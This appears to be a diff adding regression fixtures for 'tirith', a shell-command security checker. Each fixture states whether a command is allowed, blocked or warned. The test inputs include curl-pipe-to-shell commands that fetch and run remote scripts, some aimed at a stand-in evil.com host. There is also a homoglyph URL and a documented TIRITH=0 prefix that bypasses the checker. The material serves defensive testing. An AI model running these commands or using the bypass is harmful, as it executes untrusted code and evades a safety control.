@@ -1,0 +1,119 @@
+# Curated regression fixtures for documented / reporter-reproduced behaviors.
+#
+# Every entry here represents a specific behavioral contract that tirith
+# either publishes (README.md, TIRITH.md, docs/) or committed to in response
+# to a closed user issue. Adding a row makes the contract machine-enforceable:
+# if a refactor breaks the documented behavior, this test fails.
+#
+# When adding an entry, include a comment pointing to the source note
+# (README.md:line or issue number) so future readers know WHY the contract
+# exists and can remove the entry if the underlying doc changes.
+
+# README.md:539 / TIRITH.md:804 — `TIRITH=0 <cmd> | <interp>` is the published
+# whole-line bypass. Regressed by commit cdbe48f as issue #78; restored via
+# the pipe-vs-sequence distinction in find_inline_bypass. Without --interactive
+# the default policy rejects env bypass in non-interactive mode, so this
+# fixture exercises the interactive path that shell hooks take.
+
+[[fixture]]
+name = "documented_tirith_zero_pipe_bypass"
+min_milestone = 0
+input = "TIRITH=0 curl -L https://example.com | bash"
+context = "exec"
+shell = "posix"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "documented_tirith_zero_pipe_bypass_multi_interp"
+min_milestone = 0
+input = "TIRITH=0 curl -sSL https://install.example.com | python3 -"
+context = "exec"
+shell = "posix"
+expected_action = "allow"
+expected_rules = []
+
+# issue #78 regression guard: sequencing operators must NOT inherit the bypass.
+# `TIRITH=0 ls && curl http://evil | sh` — the second command should fire
+# plain_http_to_sink / curl_pipe_shell even though the first is bypass-prefixed.
+
+[[fixture]]
+name = "documented_tirith_zero_does_not_extend_to_and_and_chain"
+min_milestone = 0
+input = "TIRITH=0 ls && curl http://evil.com/x.sh | sh"
+context = "exec"
+shell = "posix"
+expected_action = "block"
+expected_rules = ["plain_http_to_sink", "curl_pipe_shell"]
+
+# issue #26 — `scp <local> <host>:<path>` must not trip schemeless_to_sink.
+# The reporter's exact command shape:
+
+[[fixture]]
+name = "documented_scp_host_path_not_schemeless"
+min_milestone = 0
+input = "scp test.asdf testhost:/home/user/"
+context = "exec"
+shell = "posix"
+expected_action = "allow"
+expected_rules = []
+
+# issue #60 back-compat (within #26's replacement parser): user@host form
+# with no colon must still suppress schemeless_to_sink.
+
+[[fixture]]
+name = "documented_scp_user_at_host_not_schemeless"
+min_milestone = 0
+input = "scp user@server.com file.txt"
+context = "exec"
+shell = "posix"
+expected_action = "allow"
+expected_rules = []
+
+# issue #29 — `tirith diff <suspicious-url>` must not block on URL-derived
+# Unicode rules or on the separate exec-context byte scan. The inert-arg-range
+# carveout covers both arms. Cyrillic 'а' (U+0430) inside the URL arg.
+
+[[fixture]]
+name = "documented_tirith_diff_suppresses_url_rules"
+min_milestone = 0
+input = "tirith diff https://exаmple.com"
+context = "exec"
+shell = "posix"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "documented_tirith_score_suppresses_byte_scan_rules"
+min_milestone = 0
+input = "tirith score https://exаmple.com"
+context = "exec"
+shell = "posix"
+expected_action = "allow"
+expected_rules = []
+
+# issue #29 scope guard — `tirith run` IS a sink and MUST still fire URL
+# rules. Adding `run` to the inert list would break this fixture.
+
+[[fixture]]
+name = "documented_tirith_run_still_acts_as_sink"
+min_milestone = 0
+input = "tirith run http://evil.com/x.sh"
+context = "exec"
+shell = "posix"
+expected_action = "block"
+expected_rules = ["plain_http_to_sink"]
+
+# issue #76 regression — files with box-drawing characters near dynamic-code
+# patterns used to panic at codefile.rs:97. This fixture in exec context
+# verifies that multi-byte URL paths also don't panic in the main extractor
+# path (the codefile.rs panic itself is unit-tested in rules/codefile.rs).
+
+[[fixture]]
+name = "documented_multibyte_url_path_no_panic"
+min_milestone = 0
+input = "curl https://example.com/═══════"
+context = "exec"
+shell = "posix"
+expected_action = "warn"
+expected_rules = ["non_ascii_path"]
